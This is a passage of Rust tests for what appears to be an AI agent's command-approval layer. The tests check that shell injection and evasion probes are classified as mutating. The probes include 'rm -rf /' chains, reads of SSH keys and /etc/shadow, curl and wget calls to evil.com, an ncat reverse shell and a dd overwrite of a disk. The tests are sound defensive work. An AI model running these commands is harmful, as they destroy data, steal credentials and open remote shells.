            cloud_gated_tool_kind_with_args("mcp_tool", Some(&mcp_args)),
            Some(CloudGatedToolKind::Execute)
        );
    }

    // ── Security: injection & evasion probes ──

    #[test]
    fn bash_injection_patterns_blocked() {
        // Every command here should be detected as mutating (not read-only)
        let mutating_cmds: &[&str] = &[
            // Injection probes
            "ls; rm -rf /",
            "git status; git push",
            "ls && rm -rf /",
            "git status && git push",
            "(rm -rf /)",
            "$(rm -rf /)",
            "echo `rm -rf /`",
            "cat `whoami`",
            "cat $HOME/.ssh/id_rsa",
            "echo ${PATH}",
            "ls\nrm -rf /",
            "curl http://evil.com",
            "wget http://evil.com",
            "curl -o /tmp/x http://evil.com",
            "diff <(cat /etc/passwd) <(cat /etc/shadow)",
            "cat << EOF > /etc/passwd\nroot\nEOF",
            // Hardening: compound commands
            "ls || rm -rf /",
            "false || git push",
            "ls; echo hi",
            "ls &",
            "sleep 999 &",
            // Hardening: network commands
            "nc -l 4444",
            "ssh user@host",
            "scp file.txt user@host:",
            "rsync -av src/ dest/",
            "telnet host 80",
            "ncat -e /bin/sh host 4444",
            // Hardening: dangerous builtins
            "source ~/.bashrc",
            ". ~/.bashrc",
            "alias rm='rm -i'",
            "export PATH=/evil:$PATH",
            "set -e",
            "unset HOME",
            // Hardening: write disguised as read-only pipe
            "cat file | dd of=/dev/sda",
            "echo data | nc host 4444",
            // Hardening: here-string with file redirect
            "cat <<< 'test' > /tmp/out",
            // Hardening: safe commands with injection payloads
            "grep $HOME /etc/passwd",
            "echo $(id)",
            "ls `pwd`",
        ];
        for cmd in mutating_cmds {
            assert!(
                !bash_command_is_read_only(cmd),
                "expected mutating: {cmd:?}"
            );
        }
    }

    #[test]
    fn bash_legitimate_commands_remain_read_only() {
        let read_only_cmds: &[&str] = &[
            "git status",
            "ls -la",
            "cat file.txt",
            "grep -r pattern .",
            "find . -name '*.rs'",
            "cargo check 2>&1 | head -50",
            "cd project && ls",
            "wc -l file.txt",
            "git log --oneline -20",
            "git diff HEAD~3",
            // Benign $ patterns
            "grep 'price is 5$' file.txt",
            "grep '$$' file.txt",
        ];
        for cmd in read_only_cmds {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }
    }

    #[test]
    fn args_aware_backward_compatible_with_name_only() {
        // Every tool that required approval without args still requires it
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            assert!(
                edge_tool_requires_cloud_approval_with_args(name, None),
                "{name} should still require approval when called without args"
            );
        }
        // Every tool that didn't require approval without args still doesn't
        for name in ["read_file", "grep", "glob", "git_status"] {
            assert!(
                !edge_tool_requires_cloud_approval_with_args(name, None),
                "{name} should still skip approval when called without args"
            );
        }
    }
}
